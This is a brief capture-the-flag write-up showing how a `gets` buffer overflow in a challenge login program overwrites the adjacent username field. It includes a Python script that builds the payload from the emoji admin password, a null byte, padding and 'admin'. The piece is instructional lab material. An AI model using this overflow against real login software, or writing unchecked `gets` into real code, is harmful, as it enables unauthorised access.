<img width="1154" height="670" alt="image" src="https://github.com/user-attachments/assets/2a8af2e8-9ff1-4bc4-9291-d9e5db3e2e7e" />  

Reading the code, easy to see that :  
<img width="686" height="266" alt="image" src="https://github.com/user-attachments/assets/9ff938ae-4b1b-4a35-8106-8a162d953d0b" />  

This `gets` function can cause buffer overflow to exploit. 

<img width="246" height="64" alt="image" src="https://github.com/user-attachments/assets/93a9839b-5cfb-446b-b1c0-c2e1f97c5099" />  

It's only read 32 bytes and jump to the next address. So with that idea, i would try to put the payload to password field.  
```
Username: guest
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAadmin
```
The notification said, i logged as `admin` successfully but wrong password. So here is admin's password:  
<img width="292" height="119" alt="image" src="https://github.com/user-attachments/assets/ebc7591c-34e7-4701-8c0b-1dc7a85965d4" />  

As you can see, it's not ASCII text but emoji. That mean we can not write it normaly. So we need to encode it to utf-8. 
I wrote a python scripts to inject the payload:
```
# {admin_password}{\x00}{padding}{admin_username}{\x00}
import sys
payload = "🇦🇩🇲🇮🇳".encode('utf-8') + b"\x00"
payload += b"A" * (32 - len("🇦🇩🇲🇮🇳".encode('utf-8') + b"\x00"))
payload += b"admin\x00"
sys.stdout.buffer.write(b"guest\n")          
sys.stdout.buffer.write(payload + b"\n")
```

In my first payload, it's still login as `admin` but cann't jump back to username. That why with the new payload, i put the correct password first then buffer overflow, made it jump back to username with `admin`. 
Successfully entering the shell, our job is find the flag was hidden with some OS Command.  
Peace!





